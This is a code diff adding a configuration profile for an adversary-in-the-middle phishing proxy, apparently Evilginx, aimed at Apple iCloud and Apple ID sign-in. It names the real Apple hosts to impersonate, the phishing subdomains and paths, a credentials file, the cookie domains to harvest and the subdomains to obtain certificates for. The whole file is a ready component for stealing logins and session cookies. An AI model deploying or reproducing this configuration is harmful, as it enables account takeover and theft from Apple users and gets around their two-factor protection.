@@ -1,0 +1,12 @@
+[site]
+name=icloud
+site_conf=["www.icloud.com.conf","icloud.cdn-apple.com.conf","edge.icloud.com.conf","setup.icloud.com.conf","idmsa.apple.com.conf","appleid.apple.com.conf","id.apple.com.conf","appleid.cdn-apple.com.conf"]
+creds_conf=icloud.creds
+phish_subdomains=["www"]
+phish_paths=["/"]
+target_hosts=["www.icloud.com","icloud.cdn-apple.com","edge.icloud.com","setup.icloud.com","idmsa.apple.com","appleid.apple.com","id.apple.com","appleid.cdn-apple.com"]
+cookie_hosts=["icloud.com","cdn-apple.com","apple.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-icloud.log
+cert_subdomains=["www","icloud","edge","setup","idmsa","appleid","id","appcdn"]
